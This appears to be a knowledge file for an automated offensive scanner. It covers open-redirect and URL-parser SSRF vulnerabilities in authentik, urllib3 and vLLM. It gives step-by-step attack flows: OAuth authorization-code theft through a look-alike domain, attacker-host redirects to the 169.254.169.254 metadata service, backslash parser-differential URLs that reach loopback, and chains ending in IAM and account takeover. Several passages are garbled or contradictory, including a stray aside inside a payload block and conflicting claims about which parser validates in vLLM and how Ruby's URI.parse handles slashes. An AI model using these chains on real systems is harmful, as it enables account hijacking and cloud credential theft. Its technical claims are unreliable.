---
name: open-redirect-novel-deep
description: Open redirect at the 2024–2026 frontier — authentik CVE-2024-52289 regex-metacharacter redirect-URI bypass, urllib3 CVE-2025-50181 and CVE-2025-50182 redirect-policy mismatches, measured 2026 URL-parser differentials with loopback-dispatch SSRF proof, URL-parser-disagreement SSRF class via vLLM CVE-2026-25960, and the OAuth 2.1 / RFC 9700 strict redirect-URI shift.
sibling: open_redirect
load_when: scan_mode == "deep"
---

# Open Redirect — Novel + Frontier Depth

This is the novel+frontier deep sibling to `open_redirect.md`. The base owns the class framing, the measured 5-payload × 6-parser matrix, the 3-line reproduction harness, the OAuth chain primer, the client-side sink catalog, and the primary chains. The advanced+expert sibling `open_redirect_advanced_deep.md` owns the Claroty/Snyk 16-library framework's five inconsistency classes, the five vulnerability classes, framework-specific redirect sinks, OAuth redirect_uri chain depth, SPA/service-worker/WebSocket sinks, and composite-chain construction. This file owns the 2024–2026 CVE mechanism decompositions with the canonical version/GHSA table, the measured 2026 URL-parser differentials against current CPython and urllib3, the URL-parser-disagreement SSRF class with the vLLM CVE-2026-25960 case, the OAuth 2.1 / RFC 9700 strict-redirect-URI verifier-side implications, and the current frontier status of the Claroty/Snyk 16-library framework.

Load this file when the goal is matching a target against a current CVE, measuring parser differentials against the deployed library version, or reasoning about the OAuth 2.1 BCP shift's effect on redirect-URI validation.

Every CVE number, version boundary, GHSA identifier, and patch-mechanism claim in this document is anchored to primary sources persisted in `.zen-batch-artifacts/batch9-20261003/{ghsa,nvd,docs}/` per the 1:1 manifest at `.zen-batch-artifacts/batch9-20261003/manifest/manifest.md`, and every measured primitive is reproduced by a persisted script+output under `.zen-batch-artifacts/batch9-20261003/measurement/`.

## 2024–2026 Open-Redirect CVE Version/Fix Table — Canonical

Single-owner per §2. Base and advanced siblings reference these CVEs by number + route only; the version and GHSA metadata lives here.

| CVE | GHSA | Package | Vulnerable | Patched | CVSS | CWE | Primitive |
|---|---|---|---|---|---|---|---|
| CVE-2024-52289 | *(see authentik security advisory page)* | authentik (OAuth2 provider) | `<2024.8.5`; `>=2024.10.0,<2024.10.3` | 2024.8.5 / 2024.10.3 | 7.9 v4 / 9.8 v3.1 | CWE-185 | Redirect-URI regex metacharacter allowlist bypass — `.` in registered URI matches any character via unescaped `re.fullmatch` |
| CVE-2025-50181 | GHSA-pq67-6m6q-mj2v | urllib3 | `<2.5.0` | 2.5.0 | 5.3 v3.1 | CWE-601 | Redirects not disabled when retries are disabled on PoolManager instantiation |
| CVE-2025-50182 | GHSA-48p4-8xcf-vxj5 | urllib3 | `>=2.2.0,<2.5.0` | 2.5.0 | 5.3 v3.1 | CWE-601 | Redirects not controlled in browsers (Pyodide) / Node.js runtime; `retries=False` not honored |
| CVE-2026-25960 | *(no GHSA mapping observed)* | vLLM | `>=0.15.1,<0.17.0` | 0.17.0 | 7.1 v3.1 | **CWE-918 (SSRF)** — not CWE-601 | `load_from_url_async` SSRF via `urllib3.util.parse_url` vs `aiohttp/yarl` host-parse mismatch; bypasses CVE-2026-24779 fix (adjacent-class case study) |
| CVE-2021-23435 | GHSA-4hpq-rjcx-7vj9 | clearance (Rails gem) | `<2.5.0` | 2.5.0 | 6.1 MEDIUM (NVD v3.1 Primary); 7.6 HIGH (Snyk Secondary) | CWE-601 | Multi-leading-slash return-to open redirect (historical anchor for slash-confusion class) |

Notes on the table:

- **CVE-2024-52289 (authentik) has two disjoint vulnerable ranges.** The 2024.8.x branch is affected `<2024.8.5`; the 2024.10.x branch is affected `>=2024.10.0,<2024.10.3`. The fix lands at 2024.8.5 and 2024.10.3 respectively. Cite both branches. The authentik docs page (persisted at `docs/authentik-CVE-2024-52289.html`) lays them out side by side.
- **CVE-2026-25960 (vLLM) is CWE-918, not CWE-601.** It is included in this table as an adjacent-class case study: the primitive is a URL-parser disagreement between `urllib3.util.parse_url` and `aiohttp/yarl`, the same disagreement class that produces open-redirect primitives on validator-vs-fetcher pairs. Load the SSRF skill for the primary mechanism; this file covers the parser-disagreement root cause as a shared pattern across both vulnerability classes.
- **CVE-2021-23435 is the historical anchor.** The 5-slash chain is cited as an instance of the slash-confusion class, not as a current frontier claim. The mechanism is Rails passing `/////evil.com` → URI.parse stripping to `///evil.com` → browser normalizing to `//evil.com` → navigating to `evil.com`.
- **One refuted claim is explicitly excluded.** The deep-research pass refuted (3-vote) the claim that URL-encoded loopback addresses (`http://%67oogle.com` or percent-encoded `127.0.0.1`) cause urllib/requests to dispatch to `127.0.0.1`. This primitive does not reproduce on current CPython 3.12/3.13 and urllib3 2.8.0, and must not appear anywhere in this file or in the base file's matrix.

## authentik Redirect-URI Regex-Metacharacter Allowlist Bypass — CVE-2024-52289

Primitive: authentik's OAuth2 provider validates the client-supplied `redirect_uri` against the admin-configured list of registered URIs by compiling each registered URI into a regex pattern and matching with `re.fullmatch`. The validator did not apply `re.escape()` to the registered URIs before compiling, so metacharacters in the registered URI (`.`, `*`, `?`, `+`, `|`, `(`, `)`, `[`, `]`, `{`, `}`) were interpreted as regex syntax. A registered URI `https://app.example.com/callback` compiles to a pattern that treats each `.` as "any single character" — matching `https://appxexample.com/callback` or `https://app1example.com/callback`. An attacker who can register a domain matching the single-character-substitution pattern (`appxexample.com`, `app1example.com`, `appyexample.com`) passes validation; the OAuth code is delivered to the attacker's domain.

**Reachability preconditions:**

1. Application uses authentik as an OIDC / OAuth2 provider in a version matching `<2024.8.5` on the 2024.8.x branch, or `>=2024.10.0,<2024.10.3` on the 2024.10.x branch. Discovery: `/-/about` endpoint on an authentik instance leaks the version; the `/.well-known/openid-configuration` returns `authorization_endpoint` paths that are authentik-shaped (`/application/o/authorize/`).
2. An OAuth2 provider is configured in authentik's admin UI with at least one `redirect_uri` containing a regex metacharacter (`.` is nearly universal because of hostnames and TLDs; `*` and `?` are rarer but still common in template-populated configs).
3. The attacker can register (or already holds) a domain that matches the metacharacter-pattern of the configured URI. For `.`-based bypass, this requires finding a single-character-substituted TLD-adjacent name — `appxexample.com` for `app.example.com`.

**Common exposed configurations:**

- `https://app.example.com/callback` → matches `https://appxexample.com/callback` for any single character `x` where `appxexample.com` is a registerable domain.
- `https://*.app.example.com/callback` → unescaped `*` makes everything from the `*` position onward wildcarded; an attacker-registered `app.example.com.evil.com` matches.
- `https://app.example.com/callback?foo` → unescaped `?` makes the preceding `k` optional, matching `https://app.example.com/callbacfoo`.

**Sink location.** The vulnerable code is in authentik's authorization-endpoint handler, specifically the function responsible for validating the `redirect_uri` against the configured list. The pre-fix pattern (from the Omegapoint writeup `.zen-batch-artifacts/batch9-20261003/docs/authentik-CVE-2024-52289.html`):

```python
# Pre-fix (illustrative; the actual code is in authentik/providers/oauth2/views/authorize.py)
if not any(fullmatch(x, self.redirect_uri) for x in allowed_redirect_urls):
    raise RedirectURIError()
```

**Patch shape.** The fix at commit `85bb638243c8d7ea42ddd3b15b3f51a90d2b8c54` on `authentik/providers/oauth2/views/authorize.py` replaces the regex-only flow with a `RedirectURIMatchingMode.STRICT` path that uses string equality. The fix does not apply `re.escape` to the registered URIs — instead, it switches away from regex entirely for the default matching mode. The admin configuration now exposes a per-provider `redirect_uri_matching_mode` field with values STRICT (exact string match) and REGEX (opt-in; admin must explicitly request regex semantics).

**Payload shape:**

```
Attacker-registered domain: appxexample.com  (where authentik's registered URI is app.example.com)

Authorization request to the vulnerable authentik instance:
  GET /application/o/authorize/
       ?client_id=<legitimate_client_id>
       &response_type=code
       &scope=openid profile email
       &redirect_uri=https%3A%2F%2Fappxexample.com%2Fcallback
       &state=<attacker-state>

authentik's validator compiles 'app.example.com/callback' as the regex:
  app\.example\.com/callback -> wait, that would be safe
  but with no re.escape, it's actually:  app.example.com/callback
  which as a regex is: app<ANY>example<ANY>com/callback

attacker's URL matches:  app<x>example<x>com/callback -> appxexample.com/callback

Authentik's authorization server accepts, user authenticates, authorization code delivered to:
  https://appxexample.com/callback?code=<legitimate_code>&state=<attacker-state>

Attacker (controlling appxexample.com) captures the code and redeems at:
  POST /application/o/token/
       client_id=<legitimate_client_id>&client_secret=<attacker-known-or-public>
       &grant_type=authorization_code&code=<captured_code>
       &redirect_uri=https%3A%2F%2Fappxexample.com%2Fcallback

For public clients (no client secret) the redemption succeeds; for confidential clients the attacker needs the client secret, often leaked via PublicClient flag misconfiguration.
```

**Confirmation.**

1. Identify an authentik instance via `/-/about` or `/.well-known/openid-configuration`; capture the version.
2. Verify a registered OAuth2 provider by probing `/application/o/<slug>/`; capture the registered `redirect_uri` from the error or admin API if accessible.
3. Register a single-character-substituted domain (or use a pre-existing domain) matching the metachar-pattern.
4. Issue the authorization request; verify the browser is redirected to the attacker domain with a `code` parameter.
5. Error-fingerprint discriminator: a 2024.8.5+/2024.10.3+ authentik rejects the metachar-substituted URL with a specific error (`Invalid redirect URI`); pre-fix it accepts and redirects.

**Impact framing.** Full authorization-code capture → OAuth client impersonation → account access. For public clients (SPAs, mobile apps) the attacker needs no client secret; for confidential clients the chain requires the secret (often leaked). The attack applies to every OAuth2 client registered with the authentik instance that has a metachar in its `redirect_uri` configuration — i.e., almost every client with a hostname-containing URL.

**Class generalization — the regex-metacharacter-in-allowlist anti-pattern.** When a configuration-string is used as a regex pattern without escaping, the configuration is a code-injection vector. The pattern recurs across many validation surfaces: email allowlists compiled as regex, hostname allowlists compiled as regex, path allowlists compiled as regex. The hunt lead for the frontier: any configuration field that accepts a string and compiles it to a regex without `re.escape` (Python) / `Pattern.quote` (Java) / `preg_quote` (PHP) is a candidate. The adjacent-bug prediction after CVE-2024-52289: audit the full authentik codebase for other `fullmatch`/`match`/`search` calls that take configuration strings; the fix was scoped to the OAuth2 provider's authorization endpoint, but sibling endpoints (SAML, SCIM, LDAP federation) that use similar patterns are candidates.

## urllib3 Retries-Disabled-Does-Not-Disable-Redirects — CVE-2025-50181

Primitive: urllib3's `PoolManager(retries=False)` is documented to disable retries, but the pre-2.5.0 behavior did not disable the automatic redirect-following that happens as part of the retry infrastructure. A caller intending to disable all auto-fetch-chain behavior (as part of SSRF or open-redirect mitigation) still experienced redirects on 3xx responses. Combined with any application code that passes `retries=False` as a security control, the control was ineffective — the fetcher still followed Location headers.

**Reachability preconditions:**

1. Application uses urllib3 in a version matching `<2.5.0`. Discovery: `pip freeze | grep urllib3`, `requirements.txt`, or `/.well-known/dependency-manifest`.
2. The application constructs its `PoolManager` with `retries=False` as an explicit security control, intending to prevent redirect-following for untrusted targets.
3. The application makes HTTP requests to targets that may return 3xx responses; the attacker controls at least one such target.

**Common exposed configurations:**

- Webhook delivery services that use `urllib3.PoolManager(retries=False)` to prevent redirect-chains from reaching internal targets.
- Link unfurlers / preview generators that validate the first-hop URL and then expect `retries=False` to pin the fetch to that URL.
- SSRF-mitigation libraries wrapping urllib3 with explicit retry controls.

**Sink location.** urllib3's `PoolManager._make_request()` and sibling internal methods, specifically the response-processing path that interprets 3xx status codes and queues a follow-up request. The pre-2.5.0 code treated redirect-following as a separate concept from retry-on-error, with `retries` controlling only the latter.

**Patch shape.** Version 2.5.0 unifies redirect-handling under the retries parameter. The `retries=False` setting now disables both automatic retries on error and automatic redirect-following on 3xx. The fix introduces (or formalizes) a separate `redirect=` parameter for callers who want to control the two independently.

**Payload shape:**

```python
# Vulnerable application code
import urllib3
pool = urllib3.PoolManager(retries=False)  # security control, intending to disable redirect follow

# Attacker-controlled URL that 302s to internal target
response = pool.request('GET', 'https://attacker.tld/redirect-to-internal')
# Attacker's response: HTTP/1.1 302 Found\r\nLocation: http://169.254.169.254/latest/meta-data/\r\n\r\n
# Pre-fix: pool follows the 302, dispatches to the metadata service, returns the metadata response
# Post-fix (2.5.0): pool returns the 302 response, caller must explicitly follow
```

**Confirmation.** Issue a request from the target to an attacker-controlled URL that returns a 302 with `Location` pointing at an internal target. If the final response reflects the internal target's content (or the target makes a request to the internal address observable to the attacker), the pre-fix behavior is confirmed. Post-fix: the response is a 302 with Location preserved; no automatic follow.

**Impact framing.** The control that was supposed to prevent SSRF-via-redirect is ineffective. For deployments that depended on `retries=False` as the SSRF-mitigation primitive, every webhook / unfurler / fetcher is exposed. The impact is bounded by the application's chain-depth: fetchers that follow one hop are only one-hop exposed; fetchers that follow until a non-redirect are chain-depth-unbounded.

**Class generalization — the "security control is a documented side-effect" anti-pattern.** The caller's intent was clear (disable redirect-following for security); the library's implementation coupled it to an unrelated concept (retries). The hunt lead: any library parameter that documents one behavior but implements another coupled behavior. Audit urllib3 2.5.0 release notes for the full set of behaviors `retries` previously coupled — the fix may have changed more than this one case.

## urllib3 Browser/Node Redirect-Policy Mismatch — CVE-2025-50182

Primitive: urllib3 2.x compatibility with Pyodide (Python in the browser) and Node.js runtimes exposes a redirect-policy divergence: in the browser's Pyodide, redirects are controlled by the browser's own fetch policy (same-origin, follow, manual) rather than urllib3's. The `retries=False` setting that pre-2.5.0 did not disable redirects at the Python layer also does not disable them at the browser's layer. Compounding, Node.js has its own redirect-handling that urllib3 did not control. The CVE formally documents the behavioral divergence and the fix adds explicit redirect-control parameters.

**Reachability preconditions:**

1. Application runs in Pyodide (browser Python) or a Node.js-adjacent environment using urllib3 in version `>=2.2.0,<2.5.0`.
2. The application makes HTTP requests expecting urllib3-style redirect control.
3. The redirect target is attacker-influenceable (open-redirect-adjacent).

**Common exposed configurations:**

- Pyodide-hosted web apps that use urllib3 for HTTP calls to a backend; the backend responds with a 302 pointing at a different origin.
- Server-side Node.js apps using Python interop (via Python subprocesses or Pyodide-in-worker) that run urllib3 code.
- Hybrid webviews that embed a Python runtime for extension code.

**Sink location.** urllib3's platform-specific HTTP backend (`urllib3.contrib.pyodide` and the generic HTTPConnectionPool). The pre-2.5.0 code did not uniformly apply the `retries` control across backends; the browser backend used `fetch()` which honored the browser's redirect policy rather than urllib3's.

**Patch shape.** Version 2.5.0 adds explicit `redirect=` support in the Pyodide and non-standard backends, routing them through a uniform policy layer that respects the caller's intent.

**Payload shape:**

```python
# Pyodide-hosted application
import urllib3
pool = urllib3.PoolManager(retries=False)

# Attacker's target returns a 302 to a cross-origin URL
response = pool.request('GET', 'https://attacker.tld/')
# Pre-fix (urllib3 2.2.0–2.4.x in Pyodide): browser's fetch follows the 302, cross-origin
#   The response.data contains the final target's bytes, not the 302 target's
# Post-fix (2.5.0): the 302 is returned to the caller unchanged
```

**Confirmation.** Run the vulnerable pattern in a Pyodide environment; observe whether the response data reflects the final-target bytes (pre-fix follow) or the 302-source bytes (post-fix).

**Impact framing.** The impact is specific to Pyodide / Node.js deployments. For traditional server-side Python using urllib3, CVE-2025-50181 is the primary surface. For Pyodide-hosted apps that depend on urllib3's security semantics, both apply.

**Class generalization — the "same library, different backend, different behavior" anti-pattern.** Libraries that abstract over multiple backends (urllib3 for CPython/Pyodide/Node, requests for sync/async) may not apply security controls uniformly across backends. The hunt lead: any library with multiple backends is a candidate for backend-divergence bugs; audit the backend-specific code paths for consistency with the primary backend's security semantics.

## URL-Parser-Disagreement SSRF — vLLM CVE-2026-25960 as Adjacent-Class Case Study

Primitive: vLLM's `load_from_url_async` function validates the URL via `urllib3.util.parse_url` and dispatches via `aiohttp` (which uses `yarl` for URL parsing). The two parsers disagree on specific crafted URLs: `urllib3.util.parse_url` extracts one host for the validator, `yarl` extracts another for the fetcher. This is a straight application of the Claroty/Snyk framework's primary pattern (`open_redirect_advanced_deep.md § Claroty/Snyk Framework`) to a modern async-Python stack. The CVE itself is categorized as CWE-918 (SSRF) because the exploit lands in the fetcher reaching an internal target; the root cause is the parser disagreement shared with the open-redirect class.

**Reachability preconditions:**

1. Application uses vLLM in a version matching `>=0.15.1,<0.17.0`.
2. The application permits attacker-controlled URLs to `load_from_url_async` or a sibling endpoint that calls it.
3. The attacker constructs a URL producing the specific `urllib3.util.parse_url` vs `yarl` divergence.

**Sink location.** vLLM's `load_from_url_async` or the model-loading entry point that passes a URL through the two-parser pipeline. The pre-fix of CVE-2026-24779 (the earlier vLLM SSRF) attempted to block the primitive by adding an allowlist; CVE-2026-25960 is the parser-disagreement bypass of that allowlist.

**Patch shape.** Version 0.17.0 fixes by canonicalizing the URL through a single parser before both the validator and the fetcher see it. The fix shape — "use one parser for both validate and dispatch" — is the standard mitigation for the Claroty/Snyk framework class.

**Payload shape:**

```python
# Attacker-controlled URL producing the parser disagreement
# (specific payload depends on the exact parser-pair; see § Measured 2026 URL-Parser Differentials)
#
# E.g., for the backslash-as-authority primitive measured below:
url = 'http://127.0.0.1:8080\\@public-safe.example.com/'
#
# urllib3.util.parse_url extracts: host='127.0.0.1', port=8080  (unexpected — the raw target)
# yarl / aiohttp extracts: host='public-safe.example.com'  (the validator-visible target)
#
# vLLM's validator (yarl-based) sees public-safe.example.com, passes the allowlist.
# vLLM's fetcher (urllib3-based) dispatches to 127.0.0.1:8080.
```

Note: the exact payload depends on the specific validator and fetcher pair; the primitive requires the parser-disagreement rows in `open_redirect_advanced_deep.md § Backslash Confusion Class`. The measured differential below reproduces the pair for CPython + urllib3; vLLM's specific pair (urllib3 + yarl) will have overlapping but not identical payloads.

**Confirmation.** The payload lands if the fetcher reaches the internal target. Observe via (a) the response-time differential (internal targets have known fast / slow signatures), (b) a known side-effect at the internal target, or (c) response reflection.

**Impact framing.** SSRF reaching the model-loading pipeline's internal hosts; for vLLM-hosted LLM services this reaches model-storage endpoints, metadata services, and sibling pods in Kubernetes.

**Class generalization — URL-parser-disagreement as a shared root cause.** The vLLM CVE is CWE-918 because the exploit is SSRF, but the primitive is the same URL-parser-disagreement class that produces open-redirect bugs. The pattern recurs across validator-vs-fetcher pairs in every language ecosystem. Hunt lead for the frontier: any application that uses two different URL-parsing libraries at different layers is a candidate — audit for parser consistency, particularly across sync-vs-async boundaries (where libraries often differ) and across pre-validation vs dispatch (where allowlists and fetchers often use different libraries).

## Measured 2026 URL-Parser Differentials

Measured against CPython 3.12/3.13 and urllib3 1.26.20 / 2.8.0 on 2026-10-03. Reproduced by `.zen-batch-artifacts/batch9-20261003/measurement/scripts/06_url_parser_differentials.py` with output at `.../output/06_url_parser_differentials__urllib3.out`.

**Scheme-less-host extraction differential — payload `localhost/secret.txt`:**

```
urllib.parse.urlsplit : scheme=''  netloc=''  path='localhost/secret.txt'  hostname=None
urllib3.util.parse_url: scheme=None  host='localhost'  port=None  path='/secret.txt'
```

A validator using `urllib.parse.urlsplit(input).hostname` extracts `None` for scheme-less `localhost/secret.txt` — passing a "if hostname is None, treat as relative, allow" check. urllib3's parser extracts `host='localhost'` and `path='/secret.txt'`. A fetcher using urllib3's `PoolManager().request('GET', url)` with the default HTTP scheme dispatches to `localhost`.

**Backslash-as-authority-delimiter differential — payload `http://evil.com\@google.com/`:**

```
urllib.parse.urlsplit : scheme='http'  netloc='evil.com\@google.com'  path='/'  hostname='google.com'
urllib3.util.parse_url: scheme='http'  host='evil.com'  port=None  path='/%5C@google.com/'
```

A validator using `urllib.parse.urlsplit(input).hostname` extracts `google.com` (treating `evil.com\` as userinfo, `google.com` as host). urllib3's parser extracts `host='evil.com'` and treats the rest as a URL-encoded path. The validator sees `google.com` (passes an allowlist of `google.com`); urllib3-based fetcher dispatches to `evil.com`.

**Loopback-dispatch confirmation — zero external traffic, only 127.0.0.1:**

The measurement harness stood up a local HTTP server on `127.0.0.1:8913` and invoked `urllib3.PoolManager().request('GET', 'http://127.0.0.1:8913\\@evil.com/x')`:

```
--- PoolManager.request('GET', 'http://127.0.0.1:8913\\@evil.com/x') ---
  stdlib: hostname='evil.com' netloc='127.0.0.1:8913\@evil.com'
  urllib3: host='127.0.0.1' port=8913 path='/%5C@evil.com/x'
  dispatch status=200 body=b'loopback-fetched: /%5C@evil.com/x'
```

A stdlib-based allowlist denying `127.0.0.1` sees `hostname='evil.com'` and allows the request; urllib3 then dispatches to `127.0.0.1`. The dispatch returned status=200 and the loopback server's response body, confirming the SSRF primitive is live on current urllib3 2.8.0 and CPython 3.12.

**Explicit non-reproducing payloads (refuted claim).** The deep-research pass refuted the claim that URL-encoded loopback addresses (e.g., `http://%67oogle.com` or percent-encoded forms of `127.0.0.1`) cause urllib/requests to dispatch unexpectedly. Local measurement against CPython 3.12 and urllib3 2.8.0 did not reproduce the described behavior. This primitive is explicitly excluded from the measured matrix.

**Measurement reproduction playbook.** To re-measure against a target's specific library pair:

```bash
cd .zen-batch-artifacts/batch9-20261003/measurement/
source venvs/urllib3-2.8.0/bin/activate   # or the version matching the target
python3 scripts/06_url_parser_differentials.py 2>&1 | tee output/06_<custom>.out
```

The script accepts additional payloads via `--payload` and prints the stdlib vs urllib3 comparison. For validator-fetcher pairs beyond stdlib + urllib3 (e.g., `requests` + `aiohttp` + `yarl`), add equivalent extraction calls to the script.

## Claroty/Snyk 16-Library Current Frontier Status

The Claroty/Snyk framework examined sixteen libraries in 2022 (`open_redirect_advanced_deep.md § The Claroty/Snyk 16-Library URL-Parser-Confusion Framework`). Four years later, the per-library frontier status varies — some have been uniformly hardened, others still exhibit specific disagreements. Measured against current libraries on 2026-10-03 where feasible.

**Python `urllib`.** CPython 3.12 and 3.13 remain lenient on backslash in authority (`parse_url` and `urlsplit` do not normalize `\` to `/`) and on scheme-less inputs. The 2022 framework findings persist. The CPython issue tracker (`bugs.python.org/issue35748`) documents the backslash case; no fix has shipped at the standard-library level because the behavior is RFC-compliant (RFC 3986 does not require WHATWG normalization). Frontier status: measurable, exploitable on current versions.

**Python `urllib3`.** 2.8.0 (and 1.26.20 for legacy compatibility) exhibit the backslash-as-authority and scheme-less-host behaviors measured above. The 2025 CVEs (CVE-2025-50181, CVE-2025-50182) address redirect-handling but not the base parser's canonical-vs-RFC disagreements. Frontier status: measurable, exploitable on 2.8.0 against stdlib-based validators.

**Python `rfc3986`.** RFC-strict parser. The 2022 findings described `rfc3986` as rejecting many lenient inputs. Current status unchanged — a validator using `rfc3986` for parsing is more conservative than one using `urllib`, matching WHATWG less closely on special schemes.

**Python `httptools`.** Raises on invalid URLs where other parsers return partial results. Validators using `httptools` are safer against the parse-vs-dispatch class but may DoS on legitimate-but-unusual inputs.

**cURL.** Hardened against most of the 2022-era primitives via cURL's own URL-parser (`libcurl-url`). The scheme-smuggling and backslash variants are rejected at parse time on current versions.

**Wget.** Still susceptible to specific slash and backslash variants; the Wget codebase has had slower URL-parser modernization than cURL. Frontier status for Wget: the 2022-era findings still largely apply.

**Chrome (WHATWG URL).** The reference implementation of the WHATWG URL Standard. Backslash-to-slash normalization for special schemes is spec-mandated; most URLs render canonically. Chrome's parsing is the "browser side" of the validator-vs-browser differential across most of the measured matrix.

**Firefox and WebKit.** Also WHATWG-conformant; same behavior as Chrome on the measured payloads. Minor divergences in rare cases (fragment handling, trailing-dot normalization).

**.NET `Uri`.** .NET's `Uri` class has multiple parsing modes (`UriKind.Absolute`, `UriKind.Relative`, `UriKind.RelativeOrAbsolute`). The default mode's lenient parsing exhibits several of the 2022-era disagreements. Frontier status: measurable; the .NET team has shipped incremental hardening across .NET 7, 8, 9 but the full canonical form is still off from WHATWG.

**Java `URL` and `URI`.** `URL` is deprecated for parsing (its `getHost()` has well-known inconsistencies); `URI` is RFC-strict. The lingering frontier is in older code that uses `URL` for host extraction.

**PHP `parse_url`.** Still exhibits the 2022-era inconsistencies. `parse_url` is permissive and does not normalize backslash. Frontier status: unchanged.

**Node.js `url` (legacy).** Deprecated in Node 11; still present for backward compatibility. The WHATWG `URL` class is the recommended path. Legacy codebases using `require('url').parse()` exhibit the 2022 findings; modernized codebases using `new URL()` match WHATWG.

**Node.js `url-parse` (npm package).** Third-party library popular as a lightweight parser. Historically more-lenient than WHATWG; some disagreements with the browser remain. Frontier status: library-version-dependent; audit the version in use.

**Go `net/url`.** Strict parser; rejects most of the 2022-era lenient inputs. Validators using `net/url` are among the safer choices.

**Ruby `URI`.** Still susceptible to the leading-slash-stripping behavior that CVE-2021-23435 (Clearance) exploits. The core Ruby `URI.parse` has not changed its slash-handling.

**Perl `URI`.** Niche but still deployed. Frontier status for Perl: 2022-era findings largely persist.

**Reading of the frontier.** Of the sixteen libraries, Chrome / Firefox / WebKit / cURL have moved toward WHATWG. Python's `urllib`, `urllib3`, PHP's `parse_url`, legacy Node `url`, Ruby's `URI`, Perl's `URI`, and some older Go code remain measurable. The attack surface for the Claroty/Snyk class is the parser-pair asymmetry: pick a validator and fetcher that disagree on the measured matrix row. The common attack pair for 2026 Python deployments is `urllib`-validator + `urllib3`-fetcher — the measured differential above is directly exploitable.

## Historical Anchor — CVE-2021-23435 Clearance Multi-Leading-Slash

The Clearance CVE is the canonical case for the slash-confusion class. The primitive is a three-stage parse-chain where each stage normalizes slashes differently.

**Stage 1 — Rails routing.** The attacker submits a return-to parameter `return_to=http://www.victim.com/////evil.com`. Rails' routing passes the whole string through — multiple-leading-slashes are not normalized at the routing layer.

**Stage 2 — Clearance's return_to handler.** Clearance uses Ruby's `URI.parse` on the return-to value. `URI.parse('http://www.victim.com/////evil.com').path` returns `/////evil.com` as the path (host remains `www.victim.com`). The Clearance validator typically checks that the parsed host matches an allowed host; `www.victim.com` passes. The validator considers the URL safe.

**Stage 3 — Browser normalization.** The server issues a `Location: http://www.victim.com/////evil.com` header. The browser receives this and begins URL normalization. The URL `http://www.victim.com/////evil.com` has the authority ending at the first `/` after the host — `/////evil.com` is the path. But some browsers (older WebKit, pre-chromium Edge) treated the multi-slash prefix as a protocol-relative schema change, interpreting the subsequent path as a new host. The specific normalization-and-navigation differential in CVE-2021-23435 resulted in navigation to `http://evil.com/`.

**The chain's load-bearing step is URI.parse's path-handling.** Ruby's `URI.parse` normalized `http://www.victim.com/////evil.com` to `http://www.victim.com/////evil.com` without stripping. In contrast, some parsers canonicalize to `http://www.victim.com/evil.com` (collapsing redundant slashes). The Clearance validator trusted the parsed host; the browser's final navigation diverged.

**Patched shape.** Clearance 2.5.0 adds a comprehensive validator that compares both the parsed URL and the canonical form; it also explicitly rejects multi-leading-slash return-tos.

**Current status.** The CVE is 2021 historical. Four years later, the pattern persists in sibling frameworks that use URI-parse-and-trust-host without canonical-form comparison. The hunt lead for the current frontier: audit the full return-to / redirect-after-login flow in any Rails-adjacent framework for similar patterns. The specific URI.parse behavior that stripped two leading slashes is in the Ruby standard library and has not been changed; downstream code that depends on URI.parse's canonical form is one check away from the CVE-2021-23435 class.

## OAuth 2.1 / RFC 9700 Strict Redirect-URI Matching Shift and Verifier-Side Implications

OAuth 2.1 (consolidated 2024) and RFC 9700 (OAuth 2.0 BCP, 2025) require **exact string match** for `redirect_uri` validation. The shift closes the regex and prefix-match attack surfaces that CVE-2024-52289 (authentik) and many other historical bugs exploit.

**Pre-shift validation modes.** Before 2024, OAuth 2.0's text was ambiguous enough that implementations varied:
- **Prefix match.** `redirect_uri=https://app.example.com/callback*` matches `https://app.example.com/callbacker.evil.com/`.
- **Regex match.** `redirect_uri=https://app\.example\.com/callback.*` matches the registered URI with `.*` tail; weakened by missing `re.escape`.
- **Host-only match.** `redirect_uri=https://app.example.com/<anything>` accepted. Trivial path-manipulation produces attacker-friendly callbacks.
- **URI-canonical match.** The server canonicalizes before compare, usually via URL parsing; parser-vs-browser differentials expose.

**RFC 9700 §2.1.1 and §3.** The RFC requires exact string equality after canonicalization (lowercase host, path-component equivalence). Regex, prefix, and host-only are explicitly disallowed. Clients that need multiple redirect URIs must register each one explicitly.

**Transition window.** Deployments mid-adoption have inconsistent enforcement: some endpoints enforce strict, others don't; some clients were migrated, others weren't. The attack surface during transition is the policy-disagreement: find a non-strict endpoint, use an attacker-friendly URL, cross-present at a strict endpoint if needed.

**Verifier-side implications for OAuth deployments:**

- Authorization server: must stop interpreting the registered URI as a pattern. The authentik CVE-2024-52289 fix is directly aligned.
- Resource server: must stop trusting the `aud` claim without exact comparison; the shift extends to all URL-adjacent audience claims.
- Discovery metadata: the `redirect_uris_supported` field (if present) must list exact URIs, not patterns.
- Client registration: client-registration APIs must reject patterns; they must only accept concrete URIs.

**Confirmation that a deployment has adopted the shift.** Submit an authorization request with a `redirect_uri` that is a single-character-substituted or wildcard-adjacent variant of a known registered URI. If accepted, the deployment is still on a non-strict mode. If rejected with a specific "redirect_uri must match exactly" error, the shift is adopted.

**Adjacent-shift surfaces.** The RFC's exact-match requirement for `redirect_uri` extends to similar surfaces: `post_logout_redirect_uri`, `backchannel_logout_uri`, `request_uri` (PAR), and any URI in client metadata. Deployments that updated `redirect_uri` validation but left siblings on lax mode remain exposed on the sibling surface.

## Chaining Depth — Frontier Compositions

The 2024–2026 CVE primitives chain with the sibling-skill primitives through the specific capability each one grants.

### Chain: authentik CVE-2024-52289 + attacker-registered domain → full OAuth account access

- **Upstream node:** target uses authentik `<2024.8.5` or `>=2024.10.0,<2024.10.3` with a `redirect_uri` containing a `.` metacharacter (near-universal for hostname-containing URIs).
- **Successor precondition:** register a single-character-substituted domain or hold a pre-existing one matching the metachar pattern.
- **Postcondition of successor:** authorization code delivered to attacker domain.
- **Terminal precondition:** redeem the code at the token endpoint. For public clients: direct redemption. For confidential clients: need client secret (often leaked in client-side JavaScript, mobile app binary, or configuration).
- **Terminal postcondition:** full OAuth account access, scoped to the client's permissions.
- **Routing:** this file § authentik CVE-2024-52289 → optionally `information_disclosure.md` for client-secret leakage.

### Chain: urllib3 CVE-2025-50181 + webhook delivery service → SSRF to metadata service

- **Upstream node:** target application uses urllib3 `<2.5.0` for webhook delivery with `retries=False` as the SSRF-mitigation primitive.
- **Successor precondition:** register a webhook with the target application pointing to attacker-controlled URL.
- **Postcondition of successor:** attacker's URL returns 302 with `Location: http://169.254.169.254/latest/meta-data/`.
- **Terminal precondition:** urllib3 follows the redirect (pre-fix behavior) to the AWS metadata service.
- **Terminal postcondition:** target's webhook-delivery process reaches metadata; subsequent chain is standard EC2-metadata-to-IAM.
